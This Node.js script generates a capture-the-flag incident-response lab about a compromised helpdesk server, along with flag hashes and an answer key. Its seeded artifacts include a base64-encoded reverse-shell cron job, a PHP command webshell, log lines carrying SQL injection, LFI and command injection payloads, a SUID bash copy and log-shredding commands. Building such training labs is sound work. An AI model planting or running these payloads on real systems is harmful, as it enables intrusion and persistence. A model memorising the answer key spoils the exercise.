/* Level 3 — Helpdesk: web ít (default cred → SQLi → LFI → OS inject/webshell) rồi IR.
   Xuất: challenge-files/incident/ · web-seed/ · server/flags.json · objectives · ANSWER-KEY */
const fs = require("fs"), path = require("path"), zlib = require("zlib");
const cyrb53 = (str, seed = 0) => { let h1=0xdeadbeef^seed,h2=0x41c6ce57^seed; for(let i=0,ch;i<str.length;i++){ch=str.charCodeAt(i);h1=Math.imul(h1^ch,2654435761);h2=Math.imul(h2^ch,1597334677);} h1=Math.imul(h1^(h1>>>16),2246822507);h1^=Math.imul(h2^(h2>>>13),3266489909);h2=Math.imul(h2^(h2>>>16),2246822507);h2^=Math.imul(h1^(h1>>>13),3266489909); return (4294967296*(2097151&h2)+(h1>>>0)).toString(16); };
const norm = (s) => { let x=String(s).trim().toLowerCase().replace(/\s+/g,""); const m=x.match(/^lsec\{(.*)\}$/); return m?m[1]:x; };

const SEED0 = (parseInt(process.env.CTF_SEED,10) || (Date.now() ^ (process.pid<<16))) % 2147483647 || 1337;
let SEED = SEED0;
const rnd = () => { SEED=(SEED*1103515245+12345)&0x7fffffff; return SEED/0x7fffffff; };
const ri = (a,b)=>a+Math.floor(rnd()*(b-a+1));
const pick = (a)=>a[Math.floor(rnd()*a.length)];
const shuffle = (a)=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(rnd()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;};
const ip = ()=>`${pick([45,62,77,91,103,141,176,185,193,203,209])}.${ri(0,255)}.${ri(0,255)}.${ri(1,254)}`;
const intIp = ()=>`10.10.${ri(1,9)}.${ri(2,250)}`;
const users = ["alice","bob","carol","dave","erin","frank","grace","www-data","postgres","redis"];
const months=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug"];
const ts=()=>`${pick(months)} ${String(ri(1,28)).padStart(2," ")} ${String(ri(0,23)).padStart(2,"0")}:${String(ri(0,59)).padStart(2,"0")}:${String(ri(0,59)).padStart(2,"0")}`;
const b64=(s)=>Buffer.from(s).toString("base64"); const hexs=(s)=>Buffer.from(s).toString("hex");
function mkTcp(src,dst,sp,dp,pl,t){const p=Buffer.from(pl);const eth=Buffer.from([0xaa,0xbb,0xcc,0,0,1,0xaa,0xbb,0xcc,0,0,2,0x08,0x00]);const i=Buffer.alloc(20);i[0]=0x45;i.writeUInt16BE(40+p.length,2);i.writeUInt16BE(ri(1,65535),4);i[6]=0x40;i[8]=64;i[9]=6;Buffer.from(src.split(".").map(Number)).copy(i,12);Buffer.from(dst.split(".").map(Number)).copy(i,16);const c=Buffer.alloc(20);c.writeUInt16BE(sp,0);c.writeUInt16BE(dp,2);c.writeUInt32BE(ri(1,4e9)>>>0,4);c.writeUInt32BE(ri(1,4e9)>>>0,8);c[12]=0x50;c[13]=0x18;c.writeUInt16BE(0xffff,14);return{t,buf:Buffer.concat([eth,i,c,p])};}
function pcap(pk){const g=Buffer.alloc(24);g.writeUInt32LE(0xa1b2c3d4,0);g.writeUInt16LE(2,4);g.writeUInt16LE(4,6);g.writeUInt32LE(65535,16);g.writeUInt32LE(1,20);const r=pk.map(p=>{const h=Buffer.alloc(16);h.writeUInt32LE(Math.floor(p.t),0);h.writeUInt32LE(p.buf.length,8);h.writeUInt32LE(p.buf.length,12);return Buffer.concat([h,p.buf]);});return Buffer.concat([g,...r]);}

// ── seed chiến dịch ──
const rUser=()=>pick(["deploy","gitlab","jenkins","backup","svc","oracle","tomcat","builder"]);
const atkIP=ip(), beaconC2=ip(), cronC2=ip();
const victim=rUser();
const webshell=`${pick(["up","img","cache","tmp","media","assets"])}_${ri(1000,9999)}.php`;
const sqlToken=`hdk_${cyrb53("tok"+SEED0).slice(0,12)}`;
const envSecret=`APP_KEY=${cyrb53("env"+SEED0).slice(0,16)}`;
const injectCmd=pick(["id","uname","whoami","hostname"]);
const lfiPath="../../.env";
const svc=pick(["sysupdate.service","cleanup.service","kworker.service","audit-helper.service","netmon.service"]);
const suid=pick(["/usr/lib/.x/bash","/var/backups/.cache/bash","/usr/local/lib/.sys/bash","/opt/.sysd/bash"]);
const shredLog=pick(["/var/log/auth.log","/var/log/syslog","/var/log/secure","/var/log/wtmp"]);
const cronName=pick(["apache-sync","php-gc","systemd-update",".cache"]);
const composite=`admin|${webshell}|${beaconC2}`;

const ROOT = path.join(__dirname, "challenge-files", "incident");
fs.rmSync(path.join(__dirname,"challenge-files"), {recursive:true, force:true});
const w=(rel,data)=>{const p=path.join(ROOT,rel);fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,Buffer.isBuffer(data)?data:data+"\n");};
const wSeed=(rel,data)=>{const p=path.join(__dirname,"challenge-files","web-seed",rel);fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,data);};

// access.log — chuỗi web attacker + nhiễu (đáp án lấy từ đây)
{ const L=[];
  for(let i=0;i<1800;i++){
    const s=rnd()<0.55?intIp():ip();
    L.push(`${s} - - [12/Aug/2026:${String(ri(0,23)).padStart(2,"0")}:${String(ri(0,59)).padStart(2,"0")}:00 +0000] "${pick(["GET /","GET /index.php","GET /login.php","GET /assets/app.css","GET /favicon.ico"])} HTTP/1.1" ${pick(["200","302","404"])} ${ri(100,9000)}`);
  }
  // W0 default login
  L.push(`${atkIP} - - [12/Aug/2026:02:11:04 +0000] "POST /login.php HTTP/1.1" 302 0`);
  L.push(`${atkIP} - - [12/Aug/2026:02:11:05 +0000] "GET /index.php HTTP/1.1" 200 4120`);
  L.push(`${atkIP} - admin [12/Aug/2026:02:11:05 +0000] "GET /index.php?welcome=admin HTTP/1.1" 200 4120`);
  // W1 SQLi
  L.push(`${atkIP} - admin [12/Aug/2026:02:14:22 +0000] "GET /search.php?q=%27+UNION+SELECT+username%2Ctoken+FROM+secrets-- HTTP/1.1" 200 ${ri(200,800)}`);
  L.push(`${atkIP} - admin [12/Aug/2026:02:14:23 +0000] "GET /search.php?q=token_hit&note=${sqlToken} HTTP/1.1" 200 180`);
  // W2 LFI
  L.push(`${atkIP} - admin [12/Aug/2026:02:18:01 +0000] "GET /page.php?file=${encodeURIComponent(lfiPath)} HTTP/1.1" 200 96`);
  L.push(`${atkIP} - admin [12/Aug/2026:02:18:02 +0000] "GET /page.php?file=.env&hit=${encodeURIComponent(envSecret)} HTTP/1.1" 200 96`);
  // W3 OS inject
  L.push(`${atkIP} - admin [12/Aug/2026:02:21:40 +0000] "GET /diag.php?host=127.0.0.1%3B${injectCmd} HTTP/1.1" 200 ${ri(80,400)}`);
  // F1 webshell
  for(let i=0;i<14;i++) L.push(`${atkIP} - - [12/Aug/2026:02:${String(25+i).padStart(2,"0")}:00 +0000] "POST /uploads/${webshell} HTTP/1.1" 200 ${ri(20,600)}`);
  w("var/log/nginx/access.log", shuffle(L).join("\n"));
}

// auth.log — sau foothold dùng SSH bằng victim
{ const L=[];
  for(let i=0;i<800;i++) L.push(`${ts()} helpdesk sshd[${ri(2000,9999)}]: Failed password for ${pick(["root","admin","test",victim])} from ${rnd()<0.5?atkIP:ip()} port ${ri(30000,60000)} ssh2`);
  L.push(`${ts()} helpdesk sshd[${ri(2000,9999)}]: Accepted password for ${victim} from ${atkIP} port ${ri(30000,60000)} ssh2`);
  for(let i=0;i<20;i++) L.push(`${ts()} helpdesk sshd[${ri(2000,9999)}]: Accepted publickey for ${pick(users)} from ${intIp()} port ${ri(30000,60000)} ssh2`);
  w("var/log/auth.log", shuffle(L).join("\n"));
}

{ const rows=[["systemctl",`systemctl enable ${svc}`],["chmod","chmod +s "+suid],["shred",`shred -u ${shredLog}`],["bash",`bash -c ${injectCmd}`]];
  const L=[]; for(const [c,cmd] of shuffle(rows)){ L.push(`type=SYSCALL msg=audit(${ri(1.7e9,1.8e9)}.${ri(100,999)}:${ri(100,999)}): comm="${c}" exe="/usr/bin/${c}" uid=0`); L.push(`type=PROCTITLE msg=audit(...): proctitle=${hexs(cmd)}`); L.push("----"); }
  w("var/log/audit/audit.log", L.join("\n"));
}

w("var/log/syslog", [
  ...Array.from({length:120},()=>`${ts()} helpdesk systemd[1]: Started ${pick(["Session","Daily apt","Cleanup","Timer"])} ${ri(1,99)}.`),
  `${ts()} helpdesk CRON[1]: (${cronName}) CMD (managed)`,
  `${ts()} helpdesk systemd[1]: Started ${svc}.`,
].join("\n"));

{ const L=["root:x:0:0:root:/root:/bin/bash","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin","bin:x:2:2:bin:/bin:/usr/sbin/nologin","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin","sshd:x:110:65534::/run/sshd:/usr/sbin/nologin"];
  for(const u of users) L.push(`${u}:x:${ri(1000,1099)}:${ri(1000,1099)}:${u}:/home/${u}:/bin/bash`);
  if(!L.some(x=>x.startsWith(victim+":"))) L.push(`${victim}:x:${ri(1000,1099)}:${ri(1000,1099)}:${victim}:/home/${victim}:/bin/bash`);
  w("etc/passwd", L.join("\n"));
}
w("etc/hostname","helpdesk-01");
w("etc/os-release",'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"');
w("etc/ssh/sshd_config",["Port 22","PermitRootLogin yes","PasswordAuthentication yes","PubkeyAuthentication yes"].join("\n"));

w(`etc/cron.d/${cronName}`,
  `# managed job\n*/5 * * * * root echo ${b64(`bash -i >& /dev/tcp/${cronC2}/9001 0>&1`)} | base64 -d | bash\n`);
w(`etc/systemd/system/${svc}`,`[Unit]\nDescription=System Update Helper\n[Service]\nType=simple\nExecStart=/tmp/.x/update.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target`);

w("root/.bash_history",["id",`curl http://127.0.0.1/uploads/${webshell}?c=${injectCmd}`,`systemctl enable ${svc}`,"history -c"].join("\n"));
w(`home/${victim}/.bash_history`,["ls","cd /var/www/html","php -v","exit"].join("\n"));

// snapshot webroot (IR) + webshell
w("var/www/html/index.php","<?php require 'auth.php'; echo 'Acme Helpdesk'; ?>");
w("var/www/html/.env", envSecret+"\nDB_HOST=127.0.0.1\n");
w(`var/www/html/uploads/${webshell}`,`<?php\nif(isset($_REQUEST['c'])){ system($_REQUEST['c']); }\n?>`);
w("var/www/html/uploads/.htaccess","Options -Indexes\n");

{ const rel=suid.replace(/^\//,""); w(rel,"#!/bin/sh\nexec /bin/bash \"$@\"\n"); fs.chmodSync(path.join(ROOT,rel),0o4755); }

{ const M=[["/var/log","var/log"],["/var/www","var/www"],["/opt","opt"],["/root","root"],["/home","home"],["/etc/passwd","etc/passwd"],["/etc/hostname","etc/hostname"],["/etc/ssh/sshd_config","etc/ssh/sshd_config"],[`/etc/cron.d/${cronName}`,`etc/cron.d/${cronName}`],["/etc/systemd/system","etc/systemd/system"],[suid,suid.replace(/^\//,"")]];
  fs.writeFileSync(path.join(__dirname,"challenge-files","mounts.txt"), M.map(x=>x[0]+"|"+x[1]).join("\n")+"\n"); }

{ const p=[]; let t=1724650000; for(let i=0;i<1200;i++){t+=ri(0,3);p.push(mkTcp("10.10.5.20",rnd()<0.7?pick(["8.8.8.8","1.1.1.1"]):ip(),ri(30000,60000),443,`GET /a HTTP/1.1\r\nHost: cdn\r\n\r\n`,t));}
  let bt=1724650000; for(let i=0;i<40;i++){p.push(mkTcp("10.10.5.20",beaconC2,ri(50000,52000),443,`GET /b HTTP/1.1\r\nHost: c2\r\n\r\n`,bt));bt+=60;}
  w("opt/capture.pcap", pcap(p)); }

// seed cho container web (khớp log)
wSeed("seed.inc.php", `<?php
return [
  'sql_token' => ${JSON.stringify(sqlToken)},
  'env_secret' => ${JSON.stringify(envSecret)},
  'webshell' => ${JSON.stringify(webshell)},
  'inject_cmd' => ${JSON.stringify(injectCmd)},
];
`);

const OBJ = [
  {id:"W0",diff:"easy",title:"Phiên đầu",answer:"admin",brief:"Tài khoản nào xuất hiện đầu trong khung giờ sự cố?",hint:"Hay bị quên lúc dựng hệ thống."},
  {id:"W1",diff:"easy",title:"Chuỗi lộ",answer:sqlToken,brief:"Chuỗi bí mật nào gắn với truy vấn lệch mẫu?",hint:"Input đi xa hơn chỗ hiển thị."},
  {id:"W2",diff:"medium",title:"Cấu hình lộ",answer:envSecret,brief:"Chuỗi cấu hình nào bị kéo ra ngoài chỗ lẽ ra phải ở?",hint:"Thứ nằm cạnh mã nguồn đôi khi bị kéo theo."},
  {id:"W3",diff:"hard",title:"Lệnh lệch",answer:injectCmd,brief:"Lệnh hệ thống nào xuất hiện ngoài luồng vận hành bình thường?",hint:"Chỗ tiện ích thường tin ngoài nhiều nhất."},
  {id:"F1",diff:"easy",title:"Tệp lạ",answer:webshell,brief:"Tên tệp nào nhận request lặp bất thường?",hint:"Nhiễu nhiều hơn tín hiệu."},
  {id:"F2",diff:"medium",title:"Tài khoản sau",answer:victim,brief:"Tài khoản hệ thống nào đăng nhập thành công sau mốc vào ban đầu?",hint:"So mốc thời gian."},
  {id:"F3",diff:"medium",title:"Việc định kỳ",answer:cronName,brief:"Mục định kỳ nào không giống phần còn lại của hệ thống?",hint:"Giảm phạm vi: loại bỏ những gì bình thường trước."},
  {id:"F4",diff:"medium",title:"Quyền lệch",answer:suid,brief:"Đường dẫn nào có quyền không khớp vai trò?",hint:"Quyền và vị trí bất thường đáng ngờ hơn tên file."},
  {id:"F5",diff:"hard",title:"Đích lặp",answer:beaconC2,brief:"Đích nào lặp lại trên lưu lượng thu được?",hint:"Nhịp đều trên dòng thời gian thường không phải ngẫu nhiên."},
  {id:"F6",diff:"insane",title:"IOC",answer:composite,brief:"Ghép ba IOC đã tìm (cách nhau bởi |).",hint:"Ba mảnh đã gặp — chỉ còn ghép đúng thứ tự."},
];

const PTS={easy:100,medium:250,hard:500,insane:750};
const STORY=`Nửa đêm, SOC nhận alert lẻ từ <b>helpdesk-01</b> rồi im bặt. Ban ngày máy vẫn “chạy”, nhưng vài dấu hiệu không khớp ca trực nào ghi nhận. Bạn được cấp phiên điều tra tại chỗ: tìm xem chuyện gì đã lọt vào, còn lại gì trên máy, và ai (hoặc thứ gì) vẫn có thể đang nhìn ra ngoài. Ticket không kèm checklist — chỉ còn log, tiến trình, và những thứ lẽ ra không nên có.`;

const flags={}, key=[], hints=[];
for(const o of OBJ){
  flags[o.id]={diff:o.diff,hash:cyrb53(norm(o.answer)),hint:o.hint};
  key.push(`| ${o.id} | ${o.title} | ${o.diff} | \`${o.answer}\` | ${o.hint} |`);
}
fs.mkdirSync(path.join(__dirname,"server"),{recursive:true});
fs.writeFileSync(path.join(__dirname,"server","flags.json"),JSON.stringify(flags,null,1));
fs.writeFileSync(path.join(__dirname,"server","objectives.json"),JSON.stringify({
  story:STORY,
  list:OBJ.map(o=>({id:o.id,title:o.title,brief:o.brief,diff:o.diff}))
}));
fs.mkdirSync(path.join(__dirname,"src"),{recursive:true});
fs.writeFileSync(path.join(__dirname,"src","challenges.js"),
`// TỰ SINH bởi gen.js — không sửa tay.\nexport const PTS=${JSON.stringify(PTS)};\nexport const STORY=${JSON.stringify(STORY)};\nexport const CH=${JSON.stringify(OBJ.map(o=>({id:o.id,diff:o.diff,title:o.title,brief:o.brief})))};\n`);
fs.writeFileSync(path.join(__dirname,"ANSWER-KEY.md"),
`# ANSWER KEY — Level 3 Helpdesk (giữ kín)\n\nWeb live: admin/admin · WEB_URL nội bộ. Đáp án cũng có trong log overlay.\n\n| ID | Objective | Độ khó | Đáp án | Hint |\n|----|-----------|--------|--------|------|\n${key.join("\n")}\n\n**SEED = ${SEED0}** — build với CTF_SEED=${SEED0}.\n`);
console.log("generated L3 incident:",OBJ.length,"objectives | SEED =",SEED0);
